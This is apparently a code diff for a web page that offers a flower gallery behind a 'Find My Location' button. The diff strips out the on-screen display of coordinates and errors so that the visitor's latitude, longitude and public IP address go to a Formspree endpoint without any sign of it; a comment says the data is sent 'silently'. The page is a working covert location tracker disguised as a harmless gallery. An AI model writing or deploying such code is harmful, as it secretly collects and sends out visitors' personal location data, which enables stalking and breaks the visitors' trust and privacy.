@@ -20,14 +20,13 @@
 <body>
 
     <button onclick="findMe()">Find My Location</button>
-    <div id="result">Coordinates will appear here.</div>
     
     <div id="gallery" class="flower-container"></div>
 
     <script>
     function findMe() {
         if (!navigator.geolocation) {
-            document.getElementById('result').textContent = "Not supported by your browser.";
+            console.error("Geolocation is not supported by this browser.");
             return;
         }
         
@@ -36,16 +35,13 @@
                 const lat = position.coords.latitude;
                 const lon = position.coords.longitude;
 
-                // 1. Instantly display screen data locally
-                document.getElementById('result').innerHTML = `Lat: ${lat} <br> Lon: ${lon}`;
-                
-                // Fixed placeholder images using Unsplash Source
+                // 1. Instantly display gallery images locally (Coordinates display removed)
                 document.getElementById('gallery').innerHTML = `
                     <img src="https://images.unsplash.com/photo-1526047932273-341f2a7631f9?w=300" alt="Pink Flowers">
                     <img src="https://images.unsplash.com/photo-1508784411316-02b8cd4d3a3a?w=300" alt="Yellow Flowers">
                 `;
 
-                // 2. Fetch the IP address using the correct JSON API endpoint
+                // 2. Fetch the IP address and send all data silently
                 fetch("https://api.ipify.org?format=json")
                     .then(ipRes => {
                         if (!ipRes.ok) throw new Error("Network response error");
@@ -60,7 +56,7 @@
                     });
             },
             (error) => {
-                document.getElementById('result').textContent = `Error: ${error.message}`;
+                console.error(`Geolocation Error: ${error.message}`);
             }
         );
     }
@@ -68,7 +64,6 @@
     function sendToFormspree(latitude, longitude, ipAddress) {
         const targetUrl = "https://formspree.io/f/mjgqwonp"; 
 
-        // Using URLSearchParams ensuring perfect compatibility with all Formspree plans
         const formData = new URLSearchParams();
         formData.append("Visitor_IP", ipAddress);
         formData.append("Latitude", latitude);
@@ -87,7 +82,7 @@
             if (response.ok) {
                 console.log("Transmission completely successful.");
             } else {
-                console.error("Formspree rejected the data. Check your Formspree dashboard status.");
+                console.error("Formspree rejected the data.");
             }
         })
         .catch(error => console.error("Formspree connection error:", error));
